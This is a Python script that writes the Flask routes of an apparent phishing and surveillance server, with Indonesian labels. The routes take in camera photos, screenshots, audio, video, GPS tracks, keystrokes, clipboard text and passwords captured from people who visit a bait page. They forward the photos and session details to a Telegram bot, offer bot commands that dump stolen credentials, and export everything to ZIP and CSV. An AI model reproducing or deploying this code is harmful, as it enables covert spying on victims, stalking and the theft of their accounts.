"""Part 2 - Routes"""
from pathlib import Path


def write_part2(PROJECT):
    F = {}

    F["app/routes/__init__.py"] = ""

    F["app/routes/capture.py"] = r'''from flask import Blueprint, render_template, request, jsonify
from datetime import datetime
import json, base64, os, requests
from app.config import Config
from app.database import db
from app.models import Session, Event

bp = Blueprint("capture", __name__)


def decode_data_url(d):
    if not d or "," not in d:
        return b""
    try:
        return base64.b64decode(d.split(",", 1)[1])
    except Exception:
        return b""


def save_bytes(ts, suffix, data, folder=None):
    folder = folder or Config.UPLOAD_DIR
    fname = ts + "_" + suffix + ".png"
    path = os.path.join(folder, fname)
    with open(path, "wb") as f:
        f.write(data)
    return fname


def reverse_geocode(lat, lon):
    if not Config.ENABLE_REVERSE_GEOCODE or not lat or not lon:
        return ""
    try:
        r = requests.get("https://nominatim.openstreetmap.org/reverse",
            params={"lat": lat, "lon": lon, "format": "json"},
            headers={"User-Agent": "CaptureDashboard/1.0"}, timeout=6)
        return r.json().get("display_name", "")
    except Exception:
        return ""


def check_vpn(ip):
    if not Config.ENABLE_VPN_CHECK or not ip:
        return False
    try:
        r = requests.get("https://proxycheck.io/v2/" + ip + "?vpn=1", timeout=6)
        return r.json().get(ip, {}).get("proxy", "no") == "yes"
    except Exception:
        return False


def send_telegram_photo(image_bytes, caption):
    if not Config.TG_TOKEN or "ISI_" in Config.TG_TOKEN:
        return False
    try:
        r = requests.post("https://api.telegram.org/bot" + Config.TG_TOKEN + "/sendPhoto",
            data={"chat_id": Config.TG_CHAT_ID, "caption": caption},
            files={"photo": ("foto.png", image_bytes, "image/png")}, timeout=20)
        return r.json().get("ok", False)
    except Exception:
        return False


def send_telegram_text(text):
    if not Config.TG_TOKEN or "ISI_" in Config.TG_TOKEN:
        return False
    try:
        requests.post("https://api.telegram.org/bot" + Config.TG_TOKEN + "/sendMessage",
            json={"chat_id": Config.TG_CHAT_ID, "text": text, "parse_mode": "HTML"}, timeout=15)
        return True
    except Exception:
        return False


@bp.route("/")
def index():
    return render_template("capture.html", campaign="default")


@bp.route("/c/<campaign>")
def index_campaign(campaign):
    return render_template("capture.html", campaign=campaign)


@bp.route("/upload", methods=["POST"])
def upload():
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr or "")
    client_ip = client_ip.split(",")[0].strip()
    payload = request.get_json(force=True, silent=True) or {}
    now = datetime.now()
    ts = now.strftime("%Y%m%d_%H%M%S") + "_" + str(now.microsecond // 1000).zfill(3)
    campaign = payload.get("campaign") or "default"

    img_depan = decode_data_url(payload.get("image_depan", ""))
    img_belakang = decode_data_url(payload.get("image_belakang", ""))
    screenshot = decode_data_url(payload.get("screenshot", ""))
    audio = decode_data_url(payload.get("audio", ""))
    video = decode_data_url(payload.get("video", ""))

    has_depan = bool(img_depan)
    has_belakang = bool(img_belakang)
    has_screenshot = bool(screenshot)
    has_audio = bool(audio)
    has_video = bool(video)

    if has_depan: save_bytes(ts, "depan", img_depan)
    if has_belakang: save_bytes(ts, "belakang", img_belakang)
    if has_screenshot: save_bytes(ts, "screenshot", screenshot, Config.SCREENSHOT_DIR)
    if has_audio:
        fname = ts + "_audio.webm"
        with open(os.path.join(Config.AUDIO_DIR, fname), "wb") as f:
            f.write(audio)
    if has_video:
        fname = ts + "_video.webm"
        with open(os.path.join(Config.VIDEO_DIR, fname), "wb") as f:
            f.write(video)

    ip_info = payload.get("ip_info") or {}
    gps = payload.get("lokasi_gps") or {}
    fingerprint = payload.get("fingerprint") or {}
    local_ips = payload.get("local_ips") or []
    lat = gps.get("lat") if gps else None
    lon = gps.get("lon") if gps else None
    alamat = reverse_geocode(lat, lon) if (lat and lon) else ""
    is_vpn = check_vpn(payload.get("ip_publik"))

    s = Session(ts=ts, waktu=ts, campaign=campaign, ip_koneksi=client_ip,
        ip_publik=payload.get("ip_publik"), ip_lokal=",".join(local_ips[:5]),
        country=ip_info.get("country_name") or ip_info.get("country"),
        city=ip_info.get("city"), region=ip_info.get("region"),
        isp=ip_info.get("org") or ip_info.get("asn"), is_vpn=int(is_vpn),
        lat=lat, lon=lon, akurasi_m=gps.get("akurasi_m") if gps else None,
        alamat=alamat, user_agent=request.headers.get("User-Agent"),
        fingerprint=json.dumps(fingerprint, ensure_ascii=False),
        visitor_id=fingerprint.get("visitorId") if isinstance(fingerprint, dict) else None,
        has_depan=int(has_depan), has_belakang=int(has_belakang),
        has_screenshot=int(has_screenshot), has_audio=int(has_audio), has_video=int(has_video))

    if has_depan: send_telegram_photo(img_depan, "DEPAN " + ts + " | " + campaign)
    if has_belakang: send_telegram_photo(img_belakang, "BELAKANG " + ts)
    if has_screenshot: send_telegram_photo(screenshot, "SCREENSHOT " + ts)

    send_telegram_text("<b>Sesi Baru</b>\nWaktu: " + ts + "\nIP: " + str(s.ip_publik) +
        "\nKota: " + str(s.city) + ", " + str(s.region) + "\nISP: " + str(s.isp) +
        "\nVPN: " + ("Ya" if is_vpn else "Tidak") + "\nCampaign: " + campaign)

    db.session.add(s)
    db.session.commit()
    return jsonify({"ok": True, "msg": "Tersimpan", "ts": ts})


@bp.route("/event", methods=["POST"])
def log_event():
    payload = request.get_json(silent=True) or {}
    ts = payload.get("ts")
    if not ts:
        return jsonify({"ok": False}), 400
    e = Event(session_ts=ts, event_type=payload.get("event_type", "unknown"),
              data=json.dumps(payload.get("data") or {}, ensure_ascii=False))
    db.session.add(e)
    db.session.commit()
    return jsonify({"ok": True})
'''

    F["app/routes/intel.py"] = r'''from flask import Blueprint, request, jsonify
from datetime import datetime
import base64, os, json
from app.config import Config
from app.database import db
from app.models import Session, Keylog, Credential, Event

bp = Blueprint("intel", __name__)


def decode_data_url(d):
    if not d or "," not in d:
        return b""
    try:
        return base64.b64decode(d.split(",", 1)[1])
    except Exception:
        return b""


@bp.route("/key", methods=["POST"])
def keylog():
    p = request.get_json(force=True, silent=True) or {}
    ts = p.get("session_ts")
    if not ts:
        return jsonify({"ok": False}), 400
    k = Keylog(session_ts=ts, key=p.get("key", "")[:255], target=p.get("target", "")[:64])
    db.session.add(k)
    s = Session.query.filter_by(ts=ts).first()
    if s:
        s.keylog_count = (s.keylog_count or 0) + 1
    db.session.commit()
    return jsonify({"ok": True})


@bp.route("/clipboard", methods=["POST"])
def clipboard():
    p = request.get_json(force=True, silent=True) or {}
    ts = p.get("session_ts")
    if not ts:
        return jsonify({"ok": False}), 400
    text = (p.get("text") or "")[:5000]
    fname = ts + "_clip_" + str(int(datetime.now().timestamp())) + ".txt"
    with open(os.path.join(Config.CLIPBOARD_DIR, fname), "w", encoding="utf-8") as f:
        f.write(text)
    e = Event(session_ts=ts, event_type="clipboard", data=json.dumps({"text": text[:500]}))
    db.session.add(e)
    s = Session.query.filter_by(ts=ts).first()
    if s:
        s.clipboard_count = (s.clipboard_count or 0) + 1
    db.session.commit()
    return jsonify({"ok": True})


@bp.route("/credential", methods=["POST"])
def credential():
    p = request.get_json(force=True, silent=True) or {}
    ts = p.get("session_ts")
    if not ts:
        return jsonify({"ok": False}), 400
    c = Credential(session_ts=ts, username=p.get("username", "")[:255],
                    password=p.get("password", "")[:255], source=p.get("source", "unknown")[:64])
    db.session.add(c)
    db.session.commit()
    return jsonify({"ok": True})


@bp.route("/location", methods=["POST"])
def location():
    p = request.get_json(force=True, silent=True) or {}
    ts = p.get("session_ts")
    if not ts:
        return jsonify({"ok": False}), 400
    fname = ts + "_track.jsonl"
    path = os.path.join(Config.TRACKING_DIR, fname)
    with open(path, "a", encoding="utf-8") as f:
        f.write(json.dumps({"t": datetime.now().isoformat(), "lat": p.get("lat"),
                            "lon": p.get("lon"), "acc": p.get("acc")}) + "\n")
    return jsonify({"ok": True})


@bp.route("/motion", methods=["POST"])
def motion():
    p = request.get_json(force=True, silent=True) or {}
    ts = p.get("session_ts")
    if not ts:
        return jsonify({"ok": False}), 400
    e = Event(session_ts=ts, event_type="motion", data=json.dumps(p.get("data") or {}))
    db.session.add(e)
    db.session.commit()
    return jsonify({"ok": True})


@bp.route("/network", methods=["POST"])
def network():
    p = request.get_json(force=True, silent=True) or {}
    ts = p.get("session_ts")
    if not ts:
        return jsonify({"ok": False}), 400
    e = Event(session_ts=ts, event_type="network", data=json.dumps(p.get("data") or {}))
    db.session.add(e)
    db.session.commit()
    return jsonify({"ok": True})
'''

    F["app/routes/burst.py"] = r'''from flask import Blueprint, request, jsonify
import base64, os
from app.config import Config
from app.database import db
from app.models import BurstPhoto, Session

bp = Blueprint("burst", __name__)


def decode_data_url(d):
    if not d or "," not in d:
        return b""
    try:
        return base64.b64decode(d.split(",", 1)[1])
    except Exception:
        return b""


@bp.route("/upload", methods=["POST"])
def upload_burst():
    p = request.get_json(force=True, silent=True) or {}
    ts = p.get("session_ts")
    frame = p.get("frame_num", 0)
    img = decode_data_url(p.get("image", ""))
    if not ts or not img:
        return jsonify({"ok": False}), 400
    fname = ts + "_burst_" + str(frame).zfill(3) + ".png"
    with open(os.path.join(Config.BURST_DIR, fname), "wb") as f:
        f.write(img)
    db.session.add(BurstPhoto(session_ts=ts, filename=fname, frame_num=frame))
    s = Session.query.filter_by(ts=ts).first()
    if s:
        s.burst_count = (s.burst_count or 0) + 1
    db.session.commit()
    return jsonify({"ok": True, "filename": fname})
'''

    F["app/routes/dashboard.py"] = r'''from flask import Blueprint, render_template, request, redirect, url_for, make_response, jsonify
from app.auth import create_token, login_required
from app.config import Config
from app.models import Session as SessionModel, Event, BurstPhoto, Keylog, Credential
import json

bp = Blueprint("dashboard", __name__)


@bp.route("/login", methods=["GET", "POST"])
def login_page():
    if request.method == "POST":
        u = request.form.get("user")
        p = request.form.get("pass")
        if u == Config.DASH_USER and p == Config.DASH_PASS:
            token = create_token(u)
            resp = make_response(redirect(url_for("dashboard.index")))
            resp.set_cookie("session_token", token, httponly=True, samesite="Lax", max_age=86400 * 7)
            return resp
        return render_template("login.html", error="Username/password salah")
    return render_template("login.html")


@bp.route("/logout")
def logout():
    resp = make_response(redirect(url_for("dashboard.login_page")))
    resp.delete_cookie("session_token")
    return resp


@bp.route("/dashboard")
@login_required
def index():
    rows = SessionModel.query.order_by(SessionModel.id.desc()).limit(500).all()
    sessions = [r.to_dict() for r in rows]
    stats = {
        "total": SessionModel.query.count(),
        "with_photo": SessionModel.query.filter((SessionModel.has_depan == 1) | (SessionModel.has_belakang == 1)).count(),
        "with_gps": SessionModel.query.filter(SessionModel.lat.isnot(None)).count(),
        "with_screenshot": SessionModel.query.filter(SessionModel.has_screenshot == 1).count(),
        "keys_total": Keylog.query.count(),
        "creds_total": Credential.query.count(),
    }
    return render_template("dashboard.html", sessions=sessions, stats=stats, stats_json=json.dumps(stats))


@bp.route("/api/stats")
@login_required
def api_stats():
    return jsonify({"total": SessionModel.query.count()})


@bp.route("/api/session/<ts>/events")
@login_required
def api_events(ts):
    rows = Event.query.filter_by(session_ts=ts).order_by(Event.id.desc()).limit(200).all()
    return jsonify([{"id": r.id, "event_type": r.event_type, "data": r.data,
                     "created_at": r.created_at.isoformat() if r.created_at else None} for r in rows])


@bp.route("/api/session/<ts>/burst")
@login_required
def api_burst(ts):
    rows = BurstPhoto.query.filter_by(session_ts=ts).order_by(BurstPhoto.frame_num).all()
    return jsonify([{"id": r.id, "filename": r.filename, "frame_num": r.frame_num} for r in rows])


@bp.route("/api/session/<ts>/keys")
@login_required
def api_keys(ts):
    rows = Keylog.query.filter_by(session_ts=ts).order_by(Keylog.id).all()
    return jsonify([{"key": r.key, "target": r.target,
                     "created_at": r.created_at.isoformat() if r.created_at else None} for r in rows])


@bp.route("/api/session/<ts>/creds")
@login_required
def api_creds(ts):
    rows = Credential.query.filter_by(session_ts=ts).order_by(Credential.id).all()
    return jsonify([{"username": r.username, "password": r.password, "source": r.source} for r in rows])


@bp.route("/api/creds")
@login_required
def api_all_creds():
    rows = Credential.query.order_by(Credential.id.desc()).limit(200).all()
    return jsonify([{"ts": r.session_ts, "username": r.username, "password": r.password,
                     "source": r.source} for r in rows])
'''

    F["app/routes/api.py"] = r'''from flask import Blueprint, jsonify, send_file, send_from_directory
from app.auth import login_required
from app.config import Config
from app.models import Session as SessionModel, Event, BurstPhoto, Keylog, Credential
from app.database import db
import os, io, zipfile, csv

bp = Blueprint("api", __name__)

FOLDERS = ["UPLOAD_DIR", "SCREENSHOT_DIR", "BURST_DIR", "KEYS_DIR",
           "CLIPBOARD_DIR", "AUDIO_DIR", "VIDEO_DIR", "TRACKING_DIR"]


def _all_folders():
    return [getattr(Config, k) for k in FOLDERS]


@bp.route("/delete/<ts>", methods=["POST", "DELETE"])
@login_required
def delete_session(ts):
    for folder in _all_folders():
        if os.path.isdir(folder):
            for f in os.listdir(folder):
                if f.startswith(ts):
                    try: os.remove(os.path.join(folder, f))
                    except: pass
    SessionModel.query.filter_by(ts=ts).delete()
    Event.query.filter_by(session_ts=ts).delete()
    BurstPhoto.query.filter_by(session_ts=ts).delete()
    Keylog.query.filter_by(session_ts=ts).delete()
    Credential.query.filter_by(session_ts=ts).delete()
    db.session.commit()
    return jsonify({"ok": True, "msg": "Sesi dihapus"})


@bp.route("/delete-all", methods=["POST", "DELETE"])
@login_required
def delete_all():
    count = SessionModel.query.count()
    for folder in _all_folders():
        if os.path.isdir(folder):
            for f in os.listdir(folder):
                try: os.remove(os.path.join(folder, f))
                except: pass
    SessionModel.query.delete()
    Event.query.delete()
    BurstPhoto.query.delete()
    Keylog.query.delete()
    Credential.query.delete()
    db.session.commit()
    return jsonify({"ok": True, "msg": str(count) + " sesi dihapus"})


@bp.route("/file/<path:fname>")
@login_required
def get_file(fname):
    for folder in _all_folders():
        if os.path.isfile(os.path.join(folder, fname)):
            return send_from_directory(folder, fname)
    return jsonify({"ok": False}), 404


@bp.route("/session/<ts>")
@login_required
def session_detail(ts):
    s = SessionModel.query.filter_by(ts=ts).first()
    if not s:
        return jsonify({"ok": False}), 404
    d = s.to_dict()
    d["event_count"] = Event.query.filter_by(session_ts=ts).count()
    d["burst_count"] = BurstPhoto.query.filter_by(session_ts=ts).count()
    d["key_count"] = Keylog.query.filter_by(session_ts=ts).count()
    d["cred_count"] = Credential.query.filter_by(session_ts=ts).count()
    return jsonify({"ok": True, "data": d})


@bp.route("/export/zip")
@login_required
def export_zip():
    mem = io.BytesIO()
    with zipfile.ZipFile(mem, "w", zipfile.ZIP_DEFLATED) as z:
        for k in FOLDERS:
            folder = getattr(Config, k)
            folder_name = k.replace("_DIR", "").lower()
            if os.path.isdir(folder):
                for f in os.listdir(folder):
                    fp = os.path.join(folder, f)
                    if os.path.isfile(fp):
                        z.write(fp, arcname=folder_name + "/" + f)
        rows = SessionModel.query.all()
        import json as _j
        z.writestr("sessions.json", _j.dumps([r.to_dict() for r in rows], indent=2, default=str))
    mem.seek(0)
    return send_file(mem, mimetype="application/zip", as_attachment=True, download_name="capture_export.zip")


@bp.route("/export/creds")
@login_required
def export_creds():
    rows = Credential.query.order_by(Credential.id.desc()).all()
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(["ts", "username", "password", "source", "created_at"])
    for r in rows:
        w.writerow([r.session_ts, r.username, r.password, r.source, r.created_at])
    mem = io.BytesIO(buf.getvalue().encode("utf-8"))
    return send_file(mem, mimetype="text/csv", as_attachment=True, download_name="credentials.csv")
'''

    F["app/routes/telegram_hook.py"] = r'''from flask import Blueprint, request, jsonify
from app.config import Config
from app.database import db
from app.models import Session as SessionModel, Event, BurstPhoto, Keylog, Credential
from app.routes.capture import send_telegram_text, send_telegram_photo
import os

bp = Blueprint("tg_hook", __name__)


@bp.route("/webhook", methods=["POST"])
def webhook():
    update = request.get_json(silent=True) or {}
    msg = update.get("message") or {}
    text = (msg.get("text") or "").strip()

    if text in ("/start", "/help"):
        send_telegram_text("<b>Perintah:</b>\n/list /get /del /stats /creds")
        return jsonify({"ok": True})

    if text == "/stats":
        send_telegram_text(
            "<b>Statistik</b>\n"
            "Total sesi: " + str(SessionModel.query.count()) + "\n"
            "Keylog: " + str(Keylog.query.count()) + "\n"
            "Credentials: " + str(Credential.query.count())
        )
        return jsonify({"ok": True})

    if text == "/creds":
        rows = Credential.query.order_by(Credential.id.desc()).limit(20).all()
        if not rows:
            send_telegram_text("Belum ada credential.")
        else:
            lines = ["<b>Credentials:</b>"]
            for r in rows:
                lines.append("<code>" + (r.username or "") + " : " + (r.password or "") + "</code>")
            send_telegram_text("\n".join(lines))
        return jsonify({"ok": True})

    if text == "/list":
        rows = SessionModel.query.order_by(SessionModel.id.desc()).limit(10).all()
        lines = ["<b>Sesi Terbaru:</b>"]
        for r in rows:
            lines.append("- <code>" + r.ts + "</code> " + (r.city or "?") + ", " + (r.region or "?"))
        send_telegram_text("\n".join(lines) if rows else "Belum ada sesi.")
        return jsonify({"ok": True})

    if text.startswith("/get "):
        ts = text.split(" ", 1)[1].strip()
        r = SessionModel.query.filter_by(ts=ts).first()
        if not r:
            send_telegram_text("Sesi tidak ditemukan.")
            return jsonify({"ok": True})
        info = ("<b>Sesi " + ts + "</b>\nIP: " + str(r.ip_publik or r.ip_koneksi) +
                "\nKota: " + str(r.city) + ", " + str(r.region) +
                "\nISP: " + str(r.isp) + "\nGPS: " + str(r.lat) + "," + str(r.lon))
        send_telegram_text(info)
        for suffix in ["depan", "belakang", "screenshot"]:
            folder = Config.SCREENSHOT_DIR if suffix == "screenshot" else Config.UPLOAD_DIR
            fp = os.path.join(folder, ts + "_" + suffix + ".png")
            if os.path.isfile(fp):
                with open(fp, "rb") as f:
                    send_telegram_photo(f.read(), suffix + " - " + ts)
        return jsonify({"ok": True})

    if text.startswith("/del "):
        ts = text.split(" ", 1)[1].strip()
        for folder in [Config.UPLOAD_DIR, Config.SCREENSHOT_DIR, Config.BURST_DIR]:
            if os.path.isdir(folder):
                for f in os.listdir(folder):
                    if f.startswith(ts):
                        try: os.remove(os.path.join(folder, f))
                        except: pass
        SessionModel.query.filter_by(ts=ts).delete()
        Event.query.filter_by(session_ts=ts).delete()
        BurstPhoto.query.filter_by(session_ts=ts).delete()
        Keylog.query.filter_by(session_ts=ts).delete()
        Credential.query.filter_by(session_ts=ts).delete()
        db.session.commit()
        send_telegram_text("Sesi " + ts + " dihapus.")
        return jsonify({"ok": True})

    return jsonify({"ok": True})
'''

    for rel, content in F.items():
        p = PROJECT / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
